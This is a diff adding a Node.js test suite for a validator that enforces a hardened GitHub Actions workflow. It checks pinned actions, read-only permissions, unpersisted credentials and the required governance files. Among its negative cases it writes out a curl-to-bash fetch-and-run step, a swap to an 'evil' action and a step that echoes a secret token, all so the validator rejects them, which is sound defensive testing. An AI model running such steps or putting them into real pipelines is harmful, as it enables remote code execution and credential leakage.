@@ -1,0 +1,47 @@
+import test, { afterEach } from 'node:test';
+import assert from 'node:assert/strict';
+import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
+import { validateWorkflow } from '../check-workflow.mjs';
+
+const valid = `name: Repository integrity\non:\n  pull_request:\n  push:\n    branches: [main]\n  workflow_dispatch:\nconcurrency:\n  group: repository-integrity-\${{ github.event.pull_request.number || github.ref }}\n  cancel-in-progress: true\npermissions:\n  contents: read\njobs:\n  repository-integrity:\n    name: Repository integrity\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2\n        with:\n          persist-credentials: false\n      - uses: actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020 # v4.4.0\n        with:\n          node-version: 22.19.0\n      - run: npm run check\n      - run: test -z \"$(git status --porcelain=v1 --untracked-files=all)\"\n`;
+const governance = ['README.md', 'CONTRIBUTING.md', 'CHANGELOG.md', 'SECURITY.md', 'NOTICE', 'docs/decisions/0001-incubator-repository.md', 'docs/release.md', 'docs/roadmap.md', 'docs/github-admin-handoff.md', '.github/pull_request_template.md', '.github/ISSUE_TEMPLATE/bug_report.yml', '.github/ISSUE_TEMPLATE/feature_proposal.yml', '.github/ISSUE_TEMPLATE/config.yml'];
+const fixtures = new Set();
+afterEach(() => { for (const directory of fixtures) fs.rmSync(directory, { recursive: true, force: true }); fixtures.clear(); });
+function fixture(text = valid) { const root = fs.mkdtempSync(path.join(os.tmpdir(), 'workflow-')); fixtures.add(root); fs.mkdirSync(path.join(root, '.github/workflows'), { recursive: true }); fs.writeFileSync(path.join(root, '.github/workflows/repository-integrity.yml'), text); for (const file of governance) { const target = path.join(root, file); fs.mkdirSync(path.dirname(target), { recursive: true }); fs.writeFileSync(target, 'ok'); } return root; }
+function rejects(name, mutate) { test(`workflow rejects ${name}`, () => { const text = mutate(valid); assert.throws(() => validateWorkflow(fixture(text)), /workflow:/); }); }
+test('workflow accepts repository-integrity fixture', () => assert.doesNotThrow(() => validateWorkflow(fixture())));
+rejects('missing pull request trigger', text => text.replace('  pull_request:\n', ''));
+rejects('missing main push trigger', text => text.replace('    branches: [main]', '    branches: [develop]'));
+rejects('wrong push branch', text => text.replace('    branches: [main]', '    branches: [develop]'));
+rejects('missing manual dispatch', text => text.replace('  workflow_dispatch:\n', ''));
+rejects('pull request target', text => text.replace('pull_request:', 'pull_request_target:'));
+rejects('write permission', text => text.replace('contents: read', 'contents: write'));
+rejects('nested permissions bypass', text => text.replace('permissions:\n  contents: read', 'jobs:\n  nested:\n    permissions:\n      contents: read'));
+rejects('unrelated node-version bypass', text => text.replace('node-version: 22.19.0', 'node-version: 22.20.0').replace('      - run: npm run check', '      - run: node-version: 22.19.0\n      - run: npm run check'));
+rejects('missing checkout release comment', text => text.replace(' # v4.2.2', ''));
+rejects('wrong setup-node release comment', text => text.replace('# v4.4.0', '# v4.4.1'));
+rejects('unpinned action', text => text.replace(/@[0-9a-f]{40}/, '@main'));
+rejects('unknown pinned action', text => text.replace('actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020', 'evil/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020'));
+rejects('persisted checkout credentials', text => text.replace('persist-credentials: false', 'persist-credentials: true'));
+rejects('conflicting checkout credential setting', text => text.replace('persist-credentials: false', 'persist-credentials: false\n          persist-credentials: true'));
+rejects('runner', text => text.replace('ubuntu-latest', 'windows-latest'));
+rejects('Node version', text => text.replace('22.19.0', '22.20.0'));
+rejects('setup-node cache', text => text.replace('node-version: 22.19.0', 'node-version: 22.19.0\n          cache: npm'));
+rejects('setup-node registry', text => text.replace('node-version: 22.19.0', 'node-version: 22.19.0\n          registry-url: https://registry.npmjs.org'));
+rejects('stable job name', text => text.replace('    name: Repository integrity', '    name: Other job'));
+rejects('concurrency cancellation', text => text.replace('cancel-in-progress: true', 'cancel-in-progress: false'));
+rejects('repository-wide concurrency group', text => text.replace('  group: repository-integrity-${{ github.event.pull_request.number || github.ref }}\n', '  group: repository-integrity\n'));
+rejects('missing concurrency group', text => text.replace('  group: repository-integrity-${{ github.event.pull_request.number || github.ref }}\n', ''));
+rejects('secret', text => `${text}\n      - run: echo \${{ secrets.TOKEN }}\n`);
+rejects('install', text => text.replace('npm run check', 'npm install'));
+rejects('package command', text => `${text}\n      - run: npm test\n`);
+rejects('bare clean report', text => text.replace('test -z \"$(git status --porcelain=v1 --untracked-files=all)\"', 'git status --porcelain=v1 --untracked-files=all'));
+rejects('benign extra run command', text => `${text}\n      - run: echo okay\n`);
+test('workflow rejects extra workflow files', () => { const root = fixture(); fs.writeFileSync(path.join(root, '.github/workflows/extra.yml'), 'pull_request_target:'); assert.throws(() => validateWorkflow(root), /workflow:/); });
+test('workflow rejects each missing governance path', () => { for (const file of governance) { const root = fixture(); fs.unlinkSync(path.join(root, file)); assert.throws(() => validateWorkflow(root), /workflow:/, file); } });
+rejects('publish', text => `${text}\n      - run: npm publish\n`);
+rejects('deploy', text => `${text}\n      - run: deploy\n`);
+rejects('curl pipe shell', text => `${text}\n      - run: curl https://example.invalid/x | bash\n`);
+test('workflow rejects missing governance', () => { const root = fixture(); fs.unlinkSync(path.join(root, 'NOTICE')); assert.throws(() => validateWorkflow(root), /workflow:/); });
